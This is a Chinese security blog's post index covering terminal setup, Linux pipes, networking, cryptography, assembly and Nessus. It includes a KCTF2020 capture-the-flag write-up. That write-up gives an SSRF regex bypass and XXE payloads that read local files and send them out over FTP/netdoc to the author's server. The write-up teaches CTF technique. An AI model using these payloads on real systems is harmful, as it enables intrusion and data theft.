{"meta":{"title":"Auwaves","subtitle":"Blog","description":"我的博客","author":"Boringboys","url":"https://www.auwaves.com","root":"/"},"pages":[{"title":"","text":"www.boringboys.top-include-successful","path":"FileIncludeScan.html","date":"02-20","excerpt":""},{"title":"404 Not Found","text":"404 你找的页面昨晚出去之后，就再也没有回来了！ 前往主页 或者去 搜索一下本页内容","path":"/404.html","date":"03-14","excerpt":""},{"title":"about","text":"关于会不定时分享自己的学习记录和笔记，或者一些教程 Email: auwavesec#gmail.com Github: Boringboys KanXue: Boringboys Twitter: @Auwaves 订阅RSS: 点这里","path":"about/index.html","date":"03-14","excerpt":""},{"title":"activity","text":"","path":"activity/index.html","date":"03-14","excerpt":""},{"title":"categories","text":"","path":"categories/index.html","date":"03-14","excerpt":""},{"title":"links","text":"","path":"links/index.html","date":"03-14","excerpt":""},{"title":"paper","text":"","path":"paper/index.html","date":"03-14","excerpt":""},{"title":"project","text":"","path":"project/index.html","date":"03-14","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"03-14","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"03-14","excerpt":""}],"posts":[{"title":"Windows Terminal安装和美化","text":"最近撸了人生中第一台自己的游戏主机（当然除了显卡，暂时是买不起了，也不太敢买），除了玩游戏，当然也得拿来学习啊，就开始配置之前的一些环境。索性就记录一下Windows Terminal的安装和简单美化。 安装 Windows Terminal从微软应用商店安装 Windows Terminal： Windows Terminal截图如下： Windows Terminal 配置主题点击 新建标签页旁的下拉倒三角-&gt;Settings（设置） 打开设置页面： 在设置页面左侧点击 Open JSON file（打开JSON文件） ，从而通过Json配置文件进行自定义设置： 配置文件结构大致长下图这样，文件中的注释已经讲述了不同配置位置的作用，我这里就稍微再详细描述一下，其中 schemes 列表中存放一些配色方案， 配色方案添加的格式如下图所示，可以添加很多个配色方案，并给他们定义对应的名字，方便在自定义配置中引用： 至于什么是配色方案？emmm…据我的观察，应该就是定义红（red）是什么样的红，黑（black）是什么样的黑，以及黄（yellow）是什么样的黄这样的配置，以此类推，（逃） 然后是 profiles，这里就是添加一些配置的地方了，其中 profiles-&gt;list 列表中保存一些单独的配置，而 profiles-&gt;defaults 中是应用到所有配置中的通用配置，列表中的每个配置都有自己的名字，配置添加格式和 schemes 列表一样： colorScheme 参数即配色方案，可以引用上面定义的那些配色方案。注意，每个配置（profile）的配色方案也可以不通过colorScheme参数引用，而是直接把配色方案写在配置中； commandline 参数设置了该配置使用的终端，包括powershell、cmd、git等… fontFace 参数设置该配置使用的字体 tabTitle 参数是此配置打开的标签的标题； name 参数就是该配置的名字，出现在打开新标签页的下拉菜单中； 这个网站有一些别人提供的配置，可以参考一下：https://terminalsplash.com/ 配置背景图片，通过 backgroundImage 参数可以自定义终端的背景图片，同时也可以通过参数配置背景图片的位置、透明度等： 安装 oh-my-posh为了有和Linux上 oh-my-zsh 类似的体验，下面还会安装 oh-my-posh 模块对Powershell进一步进行美化 使用管理员身份启动Powershell，安装 posh-git 和 oh-my-posh 模块，安装前设置权限为 RemoteSigned。 1Set-ExecutionPolicy -Scope CurrentUser RemoteSigned 12Install-Module posh-git -Scope CurrentUserInstall-Module oh-my-posh -Scope CurrentUser 安装时如果提示需要安装 NuGet，同意安装即可。 为了让Powershell有彩色输出，还需要安装 Get-ChildItemColor 模块。 1Install-Module -AllowClobber Get-ChildItemColor 编辑 Powershell 配置文件 $PROFILE 查看配置文件路径 code $PROFILE 使用vscode打开配置文件，使用其他编辑器的自行操作，用什么编辑器不重要 在配置文件中，输入以下内容： 12345678Import-Module posh-gitImport-Module oh-my-poshSet-PoshPrompt -Theme half-life &#x2F;&#x2F; 设置主题If (-Not (Test-Path Variable:PSise)) &#123; Import-Module Get-ChildItemColor Set-Alias l Get-ChildItem -option AllScope Set-Alias ls Get-ChildItemColorFormatWide -option AllScope&#125; 其中 Set-PoshPrompt -Theme half-life 设置了 oh-my-posh 主题 half-life，这里可以根据自己喜好选择不同的主题，可以通过命令 Get-PoshThemes 获取主题列表 配置后的Powershell的样子： 可以看到有一些乱码，因为很多oh-my-posh主题使用的是powerline字体，你的系统上可能没有安装，可以自行到这里下载并安装自己喜欢的powerline字体：https://github.com/powerline/fonts 安装好字体后还需要配置Windows Terminal使用安装好的字体才可以 Windows Terminal字体的配置就是在上面提到的 profile 中的 fontFace 参数 针对vscode等其它应用，也需要配置终端使用powerline字体才可以正常显示，具体方法自行检索 oh-my-posh 展示 参考教程：https://blog.reilkay.com/BeautifyWindowsTerminal/","path":"2021/07/25/Windows Terminal安装和美化/","date":"07-25","excerpt":"最近撸了人生中第一台自己的游戏主机（当然除了显卡，暂时是买不起了，也不太敢买），除了玩游戏，当然也得拿来学习啊，就开始配置之前的一些环境。索性就记录一下Windows Terminal的安装和简单美化。","tags":[{"name":"工具","slug":"工具","permalink":"https://www.auwaves.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"Windows Terminal","slug":"Windows-Terminal","permalink":"https://www.auwaves.com/tags/Windows-Terminal/"}]},{"title":"对linux管道和grep，xrags的学习","text":"管道在linux中，管道可以将两个或多个命令的输入输出链接起来，它将上一个命令的标准输出重定向到下一个命令的标准输入假设在当前目录下的结构是： 123456789101112.├── a│ └── a.txt├── b│ └── b.txt├── c│ └── c.txt├── d│ └── d.txt├── e│ └── e.txt└── test.txt 而文件 test.txt 内容是： 1234567cabedababc 通过执行下面命令，cat 会将文件 test.txt 的内容打印到标准输出，但不会直接显示在标准输出设备上，而是会通过管道 | 重定向到 sort 并被 sort 排序之后再进行打印: 12345678$ cat test.txt | sortaababcbcde 对于管道，由它串起来的命令实际上不是依次执行的，而是同时执行的，Linux会在系统内部将它们连接起来，在前面的命令产生输出的同时，输出会被立即送给后面的命令 这里要注意的是，在这种使用方式中，后面的命令一定要支持接收标准输入，如果是 ls 这种不支持接收标准输入的命令，就会出现下面这种情况： 12$ cat test.txt | lsa b c d e test.txt 显然显示的内容只是 ls 命令的输出结果 grep命令grep 命令会从给定的文件中或者标准输入中搜索匹配的行或文本并输出 因为 grep 命令是支持接收标准输入的，所以它也可以作为管道后面的命令来处理前面命令的输出，如下： 1234$ cat test.txt | sort | grep aaababc grep a 会对前面命令的结果进行筛选，并只将包含字符 a 的行打印出来 这里也可以看出来，在一条命令里可以使用多条管道。实际上，只要你想，可以在命令里使用任意多条管道，如： 1cat test.txt | sort | grep a | grep b | grep c xargs命令xargs 命令可以将标准输入转换为命令行参数 还是上面的命令，这次通过管道链接到 xargs，效果如下 12$ cat test.txt | sort | xargsa ab abc b c d e 回到前面，我们知道 ls 命令是不支持接收标准输入的，但我们可以通过 xrags 命令将标准输入转换成参数后传递给 ls 并进一步执行，如下： 1234567891011121314151617$ cat test.txt | xargs lsls: cannot access &#39;ab&#39;: No such file or directoryls: cannot access &#39;abc&#39;: No such file or directorya:a.txtb:b.txtc:c.txtd:d.txte:e.txt cat test.txt 的输出被管道重定向到后面的命令，并由 xargs 转换成参数传递给了 ls，然后依次执行，就分别列出了对应目录的内容，或者报出文件不存在的错误 对于 xargs 命令还可以通过参数 -I 指定其转换后的参数在后面命令中的位置，比如我们想将 test.txt 文件中所列的目录拷贝到 ./test/ 中，就可以用下面命令： 1cat test.txt | xargs -I &#123;&#125; cp -r &#123;&#125; .&#x2F;test&#x2F; 执行结果如下： 123456$ cat test.txt | xargs -I &#123;&#125; cp -r &#123;&#125; .&#x2F;test&#x2F;cp: cannot stat &#39;ab&#39;: No such file or directorycp: cannot stat &#39;abc&#39;: No such file or directory$ ls testa b c d e 可以看到，结果会把 test.txt 中列出来并且存在的目录拷贝到 ./test/ 目录下","path":"2021/01/16/对linux管道和grep，xrags的学习/","date":"01-16","excerpt":"管道在linux中，管道可以将两个或多个命令的输入输出链接起来","tags":[{"name":"grep","slug":"grep","permalink":"https://www.auwaves.com/tags/grep/"},{"name":"xargs","slug":"xargs","permalink":"https://www.auwaves.com/tags/xargs/"},{"name":"管道","slug":"管道","permalink":"https://www.auwaves.com/tags/%E7%AE%A1%E9%81%93/"},{"name":"Linux","slug":"Linux","permalink":"https://www.auwaves.com/tags/Linux/"}],"preview":null},{"title":"KCTF2020 WriteUp","text":"第一题 至暗时刻 题目描述： 一道Web题，访问链接： http://121.36.145.157:8088/ 利用技术绕过限制，获得flag.txt文件中的值。 访问页面，是一张图片，查看页面源代码： &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg&quot;&gt; &lt;!--测试加载配置文件 /loadConfig?url=x.xml--&gt; &lt;/body&gt; &lt;/html&gt;发现一个被注释掉的url: http://121.36.145.157:8088/loadConfig?url=x.xml 看样子貌似可以访问指定的url但访问页面返回not allow ip，IP不被允许： 尝试 X-Forwarded-For 伪造客户端IP抓包到burp中，爆破了一些内网ip都显示not allow ip: 仅192.168端就有60000多个ip，显然也不会是爆破去做-_-| 回顾前面的网页源码发现另一个用来加载图片的链接： http://121.36.145.157:8088/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg是访问指定的url获取资源的，尝试修改url参数，返回如下的正则表达式： illegal url! ^(http|https):\\\\/\\\\/[^?#\\\\/]*\\\\.pediy\\\\.com\\\\/.*应该是要想办法绕过这个正则，访问指定的url这个正则要求url是如下格式： http://{1}.pediy.com/{2} 或 https://{1}.pediy.com/{2}{1}处不允许出现’？’，’#’，’/‘字符{2}处可以是任意内容 直接用’#’无法通过正则： 尝试进行URL编码，还是不能通过正则： 换其它符号试试，发现在做正则检查前会进行一次URL解码： 尝试进行两次URL编码绕过： 绕过成功，已经尝试去访问 https://127.0.0.1 了 在自己的vps起了web服务，用这个ssrf去访问，企图获得真实IP，然后用这个IP去利用第一个接口： 这里注意到，我的web是起在5000端口的，但直接输 http://ip:port 的形式会报错 invalid port number 所以’:’也要两次URL编码，访问成功，但是在我的vps获得的IP是 121.36.145.157 : 这不就是题目地这么，拿去 /loadConfig?url=x.xml 那里尝试，依然是 not allow ip ，行不通 又尝试ssrf http://127.0.0.1:8088/loadConfig?url=x.xml 这个url，构造请求： http://121.36.145.157:8088/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=x.xml返回结果，访问成功： 发到burp中继续尝试： 发现会从 /loadConfig?url=x.xml 指定的位置读取文件并当作XML来解析，猜测XXE漏洞 在自己的vps上放了以下payload： ================================================================================= &lt;!-- t.dtd --&gt; &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!DOCTYPE r [ &lt;!ELEMENT r ANY &gt; &lt;!ENTITY sp SYSTEM &quot;file:///etc/issue&quot;&gt; ]&gt; &lt;r&gt;&amp;sp;&lt;/r&gt; =================================================================================构造请求： /getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://{my_vps_ip}:5000/t.dtd 没有正常回显内容，尝试用FTP协议把内容发送出来，payload: ================================================================================= &lt;!-- c.dtd --&gt; &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE r [ &lt;!ENTITY % data3 SYSTEM &quot;file:///etc/issue&quot;&gt; &lt;!ENTITY % sp SYSTEM &quot;http://my_vps_ip:5000/d.dtd&quot;&gt; %sp; %param3; %exfil; ]&gt; ================================================================================= &lt;!-- d.dtd --&gt; &lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;ftp://my_vps_ip:30000/%data3;&apos;&gt;&quot;&gt; =================================================================================并在vps的30000端口上起了ftp服务，脚本：https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb 构造请求： /getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/c.dtd在vps上接收到内容 /etc/issue 文件的内容： 但是尝试读含有特殊字符的文件时，就无法正常发送数据到vps: 而且没法查看目录，没办法找flag之后又用netdoc协议试试，可以列目录，最终使用以下payload： ================================================================================= &lt;!-- g.dtd --&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY % data3 SYSTEM &quot;netdoc:///&quot;&gt; &lt;!ENTITY % sp SYSTEM &quot;http://my_vps_ip:5000/d.dtd&quot;&gt; %sp; %param3; %exfil;n ]&gt; ================================================================================= &lt;!-- d.dtd --&gt; &lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;netdoc://my_vps_ip:80/%data3;&apos;&gt;&quot;&gt; =================================================================================构造请求： /getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/g.dtd在burp中可以回显，已经可以列目录，读文件了： 之后就是列目录，看文件。。。 最后在/home下有一些jar包： 用jar:file：读jar包，尝试了spring jar包常见的路径 最后找到flag.txt的路径是 vip-demo-0.0.1-SNAPSHOT.jar包下的 /BOOT-INF/classes/flag.txt，payload： ================================================================================= &lt;!-- g.dtd --&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY % data3 SYSTEM &quot;jar:file:///home/vip-demo-0.0.1-SNAPSHOT.jar!/BOOT-INF/classes/flag.txt&quot;&gt; &lt;!ENTITY % sp SYSTEM &quot;http://{my_vps_ip}:5000/d.dtd&quot;&gt; %sp; %param3; %exfil;n ]&gt; ================================================================================= &lt;!-- d.dtd --&gt; &lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;netdoc://101.37.76.66:80/%data3;&apos;&gt;&quot;&gt; =================================================================================获得flag截图： 获得的flag是 flag{congratulations-Path-the-spring-boot} 签到题 目标程序执行如下：需要输入正确的flag 直接在IDA Pro中打开 F5查看分析代码： int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rdx signed __int64 v4; // rcx int *v5; // r8 __int64 v6; // rax char v7; // dl char v8; // cl char v9; // cl int v11; // [rsp+20h] [rbp-E0h] __int16 v12; // [rsp+24h] [rbp-DCh] char Dst; // [rsp+30h] [rbp-D0h] char v14; // [rsp+31h] [rbp-CFh] char v15; // [rsp+32h] [rbp-CEh] char v16; // [rsp+33h] [rbp-CDh] char v17; // [rsp+34h] [rbp-CCh] int v18; // [rsp+35h] [rbp-CBh] __int16 v19; // [rsp+39h] [rbp-C7h] char v20; // [rsp+3Bh] [rbp-C5h] char v21; // [rsp+130h] [rbp+30h] char v22; // [rsp+131h] [rbp+31h] char v23; // [rsp+132h] [rbp+32h] char v24; // [rsp+133h] [rbp+33h] char v25; // [rsp+134h] [rbp+34h] char v26; // [rsp+135h] [rbp+35h] memset(&amp;Dst, 0, 0x100ui64); memset(&amp;v21, 0, 0x100ui64); sub_140001250((__int64)&quot;KCTF 2020!\\n&quot;); sub_140001250((__int64)&quot;http://bbs.pediy.com\\n&quot;); sub_140001250((__int64)&quot;Please input your flag: &quot;); sub_1400011E0((__int64)&quot;%s&quot;, &amp;Dst, 256i64); v3 = &amp;Dst; v4 = -1i64; do ++v4; while ( *(&amp;Dst + v4) ); if ( (_DWORD)v4 == 12 &amp;&amp; Dst == 102 &amp;&amp; v14 == 108 &amp;&amp; v15 == 97 &amp;&amp; v16 == 103 &amp;&amp; v17 == 123 &amp;&amp; v20 == 125 ) { v5 = &amp;v11; v6 = 0i64; v12 = v19; v3 = 0i64; v11 = v18; while ( (unsigned __int8)(*(_BYTE *)v5 - 48) &lt;= 9u ) { v3 = (char *)(unsigned int)((_DWORD)v3 + 1); v5 = (int *)((char *)v5 + 1); if ( (unsigned int)v3 &gt;= 6 ) { v21 = v18; v7 = v18 + BYTE1(v18) - 48 + BYTE2(v18) - 48; v22 = v18 + BYTE1(v18) - 48; v23 = v7; v8 = v7 + HIBYTE(v18) - 48; v3 = &amp;v21; v24 = v8; v25 = v8 + v19 - 48; v26 = v25 + HIBYTE(v19) - 48; while ( 1 ) { v9 = *(&amp;v21 + v6++); if ( v9 != a2Efi[v6 - 1] ) break; if ( v6 == 7 ) { sub_140001250((__int64)&quot;You are winner!\\n&quot;, &amp;v21, &quot;2;=EFI&quot;); return 0; } } break; } } } sub_140001250((__int64)&quot;Try again!\\n&quot;, v3); return -1; } 输入的字符串从Dst处开始存放 首先会做以下判断： 查询ASCII码，DST、v14、v15、v16、v17和v20处对应的字符分别应该是‘f’、’l’、’a’、’g’、’{‘和’}’ 然后会继续做以下判断： 从v21往后的字符要分别等于a2Efi中的字符， 看到对应的字符是2;=EFI ASCII码分别是 50 59 61 69 70 73 要比较六个字符，列出以下对应关系： v21 = 50 v22 = 59 v23 = 61 v24 = 69 v25 = 70 v26 = 73 观察这六个变量的值是如何取得： 发现是根据v18和v19的值决定的从上面定义处可以发现v18是一个int型变量，所以占4个字节，四个字节中的值分别设为A、B、C、Dv19是一个16位的int型，占2个字节，值分别设为E、F BYTE1(v18) 取v18的第二个字节 B BYTE2(v18) 取v18的第三个字节 C HIBYTE(v18) 取v18最高位的一个字节 D HIBYTE(v19) 取v19最高位的一个字节 F v18 和 v19 在存放到一个字节的内存时，高位字节丢失，分别取最低位A和E所以根据上图，列出以下关系式： 50 = v21 = A 59 = v22 = A + B - 48 61 = v23 = A + B - 48 + C - 48 69 = v24 = A + B - 48 + C - 48 + D - 48 70 = v25 = A + B - 48 + C - 48 + D - 48 + E - 48 73 = v26 = A + B - 48 + C - 48 + D - 48 + E - 48 + F - 48 得到结果： A = 50 B = 57 C = 50 D = 56 E = 49 F = 51对应的字符分别是：2、9、2、8、1、3所以得到最终结果就是：flag{292813} 作者：Boringboys原文链接：https://www.boringboys.top/2020/11/20/KCTF2020第一题WP/版权声明：本文采用BY-NC-SA协议授权，转载请遵守此协议","path":"2020/11/20/KCTF2020 WriteUp/","date":"11-20","excerpt":"第一题 至暗时刻","tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.auwaves.com/tags/WEB/"},{"name":"CTF","slug":"CTF","permalink":"https://www.auwaves.com/tags/CTF/"},{"name":"逆向","slug":"逆向","permalink":"https://www.auwaves.com/tags/%E9%80%86%E5%90%91/"}],"preview":null},{"title":"广播域和冲突域","text":"冲突域又称为碰撞域，连接在同一导线上的所有工作站的集合，或者说是同一物理网段上所有节点的集合或以太网上竞争同一带宽的节点集合。在任一时刻，在一个冲突域中只能有一个节点在发送消息。如果有两个节点同时发送消息就会产生冲突。 广播域简单地说，广播域是一种环境，在该环境中通过线路发送的广播消息，可以被所有该环境中的主机或节点接收。这些主机往往通过以太网中继器或者交换机连接到一起。 区别在同一个冲突域中的每一个节点都能接收到所有被其它节点发送的帧；在同一个广播域中的每一个节点都能接收到其他节点发送的广播帧； 冲突域是基于物理层的，所以像工作在物理层的集线器、中继器之类的设备是无法划分冲突域的，因为它们本身不能识别MAC地址和IP地址，在传输数据时只是简单的复制信号。而一些处在数据链路层以上的设备都可以划分冲突域，因为它们会通过查询自身维护的一个MAC和端口的对应表，将数据传送到对应的端口，如数据链路层的交换机、网桥，网络层的路由器等设备；广播域是基于数据链路层的，所以像前面提到的集线器、中继器、网桥、交换机等设备都是无法划分广播域的，而像路由器这样的网络层设备是可以划分广播域的。 参考 知乎：冲突域、广播域的通俗讲解维基百科：广播域百度百科：冲突域 版权声明：本文采用[BY-NC-SA](https://creativecommons.org/licenses/by-nc-sa/4.0/)协议授权，转载请遵守此协议","path":"2019/05/24/网络篇之广播域和冲突域/","date":"05-24","excerpt":"冲突域又称为碰撞域，连接在同一导线上的所有工作站的集合，或者说是同一物理网段上所有节点的集合或以太网上竞争同一带宽的节点集合。在任一时刻，在一个冲突域中只能有一个节点在发送消息。如果有两个节点同时发送消息就会产生冲突。","tags":[{"name":"广播域","slug":"广播域","permalink":"https://www.auwaves.com/tags/%E5%B9%BF%E6%92%AD%E5%9F%9F/"},{"name":"冲突域","slug":"冲突域","permalink":"https://www.auwaves.com/tags/%E5%86%B2%E7%AA%81%E5%9F%9F/"},{"name":"网络","slug":"网络","permalink":"https://www.auwaves.com/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"正则表达式","text":"正则表达式，又称规则表达式。（英语：Regular Expression，代码中简写为regex、regexp或RE），计算机科学的一个概念。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。 正则表达式由一些普通字符和一些元字符（metacharacters）组成。普通字符包括大小写的字母和数字，而元字符则具有特殊的含义。 下表列出了所有的元字符和对它们的描述。 字符描述 \\将下一个字符标记为特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。 ^匹配输入字符串的开始位置。 $匹配输入字符串的结束位置。 *匹配前面的子表达式零次或多次。 +匹配前面的子表达式一次或多次。 ?匹配前面的子表达式零次或一次。 {n}n 是一个非负整数。匹配确定的 n 次。 {n,}n 是一个非负整数。至少匹配n 次。 {n,m}m和n均为非负整数，其中n","path":"2019/05/09/正则表达式/","date":"05-09","excerpt":"正则表达式，又称规则表达式。（英语：Regular Expression，代码中简写为regex、regexp或RE），计算机科学的一个概念。","tags":[{"name":"正则匹配","slug":"正则匹配","permalink":"https://www.auwaves.com/tags/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/"}],"preview":null},{"title":"密码学 Diffie-Hellman密钥交换协议","text":"概念Diffie-Hellman密钥交换协议（Diffie-Hellman key exchange agreement）简称“D-H协议”，是1976年 Whitfield Diffie 和 Martin Hellman 合作发明的安全协议，它可以让双方在完全没有对方任何预先信息的条件下通过不安全信道创建起一个密钥。这个密钥可以在后续的通信中作为对称密钥来加密通信内容。 算法描述（1）通信双方 Alice 和 Bob 先确定两个大素数 p 和 q ，这两个数不需要保密，因此通信双方可以通过不安全信道协商并确定这两个数； （2）Alice 选择一个大的随机数 r1 并计算：A=q^r1 (mod p)； （3）Alice 将 A 发送给 Bob； （4）Bob 选择另外一个大的随机数 r2 并计算：B=q^r2 (mod p)； （5）Bob 将 B 发送给 Alice； （6）Alice 计算密钥：k1=B^r1 (mod p)； （7）Bob 计算密钥：k2=A^r2 (mod p) ps:最后，Alice 和 Bob 计算得到的 k1=k2，即得到的密钥 举例（1）假设 Alice 和 Bob 选取的 p=11 ， q=5； （2）Alice 选择的随机数取 r1=3，则 A=5^3 (mod 11)=4； （3）Alice 将 A=4 发送给 Bob； （4）Bob 选择的随机数取 r2=6，则 B=5^6 (mod 11)=5； （5）Bob 将 B=5 发送给 Alice； （6）Alice 计算：k1=5^3 (mod 11)=4； （7）Bob 计算：k2=4^6 (mod 11)=4； （8）交换得到的密钥：k1=k2=4 安全性D-H协议的安全性在于，在有限域中计算离散对数远远难于在同一个域中计算指数。 从上面给出的例子解释，就是当 Alice 知道 r1=3，以及 p 和 q 的情况下可以十分容易的计算得到 A；而第三方在只知道 p，q 和 A 的情况下却很难计算得到 Alice 取得随机数 r1，所以无法使用 Bob 通过公共信道发送的 B 计算得到密钥 k；对于 Bob 取的随机数 r2，与对 Alice 的分析一样，第三方同样难以通过计算得到，也就难以通过 Alice 发送的 A 计算出密钥。 缺陷D-H协议也存在缺陷，即容易受到中间人攻击 ( Man-in-the-Middle Attack ，简称 “MITM攻击” ) ，就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信双方却毫不知情。 中间人攻击的过程如下： （1）第一步和上面所说的一样，通信双方 Alice 和 Bob 先确定两个大素数 p 和 q ，这两个数不需要保密，因此通信双方可以通过不安全信道协商并确定这两个数；设 p=11 ，q=5； （2）窥探者 Eve 监听他们两个的会话，并得到了 p 和 q 的值； （3）Alice、Bob、Eve 同时选择随机数：设 Alice 选择的还是 r1=3 ，Bob 选择的是 r2=6，Eve 选择两个随机数 r1&#39;=8，r2&#39;=9； （4）Alice、Bob、Eve 分别计算 q^r (mod p)：Alice 计算得 A=4 ，Bob 计算得 B=5 ，Eve 计算得 A&#39;=13,B&#39;=12 （5）然后按照协议 Alice 将自己计算的 A 发送给 Bob，此时 Eve 截获这个 A，并将自己计算得到的 A&#39; 发送给 Bob，Bob 对此过程并不知情； （6）同样 Eve 也截获了 Bob 发送给 Alice 的 B，并将 B&#39; 发送给 Alice，Alice 同样对此过程毫不知情； （7）此时 Eve 可以根据截获的 A 、B 分别计算出 自己和 Alice 通信的密钥 以及 自己和Bob通信的密钥，分别与 Alice 、Bob 共享不同的密钥。 这样一来，Eve 就可以分别与 Alice 和 Bob 通信，而 Alice 和 Bob 仍认为和自己通信的是对方，对第三方并不知情。 作者：Boringboys原文链接：https://www.boringboys.top/2018/12/04/密码学Diffie-Hellman密钥交换协议/版权声明：本文采用BY-NC-SA协议授权，转载请遵守此协议","path":"2018/12/04/密码学Diffie-Hellman密钥交换协议/","date":"12-04","excerpt":"概念Diffie-Hellman密钥交换协议（Diffie-Hellman key exchange agreement）简称“D-H协议”","tags":[{"name":"安全","slug":"安全","permalink":"https://www.auwaves.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"学习","slug":"学习","permalink":"https://www.auwaves.com/tags/%E5%AD%A6%E4%B9%A0/"}],"preview":null},{"title":"汇编语言学习笔记（一）","text":"汇编语言的产生 机器语言首先，我们了解一下机器语言，机器语言是机器指令的集合。 机器指令就是CPU可以正确执行的命令。实际上就是一列二进制数字。CPU内部将这些二进制数字转变成对应的一列高低电平，然后驱动电子器件进行运算。 CPU具体的工作原理这里就不深入的说了，感兴趣的读者可以自己搜索学习。 我们都知道CPU是一种微处理器，对于不同的微处理器由于硬件设计和结构的不同，会需要不同的电平脉冲来驱动电子器件，进行运算。所以每种处理器都有自己的机器指令集（像x86架构的CPU和ARM架构的CPU就是拥有各自的指令集），这些指令集就是机器语言。 所以，对于不同架构的CPU，可使用的机器语言也不同。 汇编语言早期的程序设计就是用的机器语言，程序员们使用 0、1 数字进行编程。机器语言过于抽象，使用机器语言实现的代码晦涩难懂、不易查错，而且难于记忆和分辨。于是就产生了汇编语言。 汇编语言的主体是汇编指令。汇编指令和机器指令是一一对应的，可以理解成把机器指令对应成了便于记忆的书写格式。例如： 1234机器指令 1000100111011000 对应的 汇编指令 mov ax,bx 所表示的操作就是：将寄存器BX的内容送到AX中 程序员可以用汇编语言编写源程序，给计算机执行时，要先用编译器将程序员写的 汇编语言 编译为 机器码 ，然后才能被计算机理解并执行。 汇编语言的组成汇编语言包括3类指令： 汇编指令：机器指令的助记符，对应特定的机器码 伪指令：没有对应的机器码，由编译器执行，计算机不执行 其他符号：由编译器识别，没有对应的机器码，如+、-、*、/等 其中，汇编指令是汇编语言的核心。 存储器提供给CPU的指令和数据存放在存储器中，这里说的存储器指的是内存，与磁盘不同的是，内存中的数据是可以直接被CPU使用的。 地址总线CPU通过地址总线来指定存储单元。 数据总线CPU和各种器件之间是通过数据总线来传送数据的，数据总线的宽度决定了CPU和其它器件之间的数据是传送速度。 控制总线CPU对外部器件的控制是通过控制总线实现的。控制总线是一些不同控制线的集合，有多少控制线就表示CPU提供了多少种对外部器件的控制，也就是说，控制总线的宽度决定了CPU对外部器件的控制能力。","path":"2018/06/11/汇编语言学习笔记（一）/","date":"06-11","excerpt":"汇编语言的产生","tags":[{"name":"汇编语言","slug":"汇编语言","permalink":"https://www.auwaves.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}],"preview":null},{"title":"Nessus在Windows上的安装","text":"NessusNessus 是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75,000个机构使用Nessus 作为扫描该机构电脑系统的软件。 该工具提供完整的电脑漏洞扫描服务，并及时更新其漏洞数据库。 Nessus不同于传统的漏洞扫描工具，它可以同时在本机或远端上遥控，进行系统的漏洞分析扫描。 获取安装包Nessus的下载地址:https://www.tenable.com/downloads/nessus点击此链接在浏览器打开如下所示的界面： 然后选择要下载的版本，这里我选择的是Nessus-8.3.1-x64.msi，即Windows版的安装包； 获取激活码在使用Nessus之前，必须先激活服务才可以使用，激活服务的激活码可以在官网获取； （1）首先在刚才的下载界面，可以看到一个“Get Activation Code”按钮，如下图所示，点击它即可前往获取激活码； （2）然后会让你选择获取哪种激活码，如下图所示： 一种是Professional版的，即专业版，需要付费获得激活码； 另外一种是Home版的，即免费版；这里我选择了Home版，点击“Register Now”，前往注册界面； （3）在注册界面填写信息以及邮箱，然后点击“Register”按钮，如下图； （4）当显示如下所示的“Thank You for Registing …”页面时，说明你已经成功获得激活码，激活码以邮件形式发送到了你所填写的邮箱； 安装Nessus（1）点击前面下载的xxx.msi安装包，安装Nessus； 按照安装导向成功安装Nessus后，会自动在浏览器打开一个如下图所示的页面，如果没有可以自己在浏览器输入“https://localhost:8834”打开； 如果输入链接后无法访问，可能是Nessus服务没有运行，前往Nessus的安装目录点击执行“nessus-service.exe”即可，如图双击“nessus-service.exe”启动Nessus服务，双击“Nessus Web Client”可以打开网页版客户端，即“http:localhost:8834”； （2）在打开的“Create an account”页面，输入用户名和密码创建一个账号，以后再次打开此页面使用Nessus时，需要使用这里设置的用户名和密码登录；（3）点击“Continue”后，会出现一个界面让你输入激活码，将前面获得的激活码输入然后继续；（4）然后就是如下图所示的初始化界面了，这一步会下载并安装一些插件，时间会有点久，但没有任何操作，等它完成就可以了； （5）完成之后，显示下面的界面，表示安装成功，你可以创建自己的扫描任务并执行了。 作者：Boringboys原文链接：https://www.boringboys.top/2019/04/23/Nessus在Windows上的安装/版权声明：本文采用BY-NC-SA协议授权，转载请遵守此协议","path":"2018/04/23/Nessus在Windows上的安装/","date":"04-23","excerpt":"NessusNessus 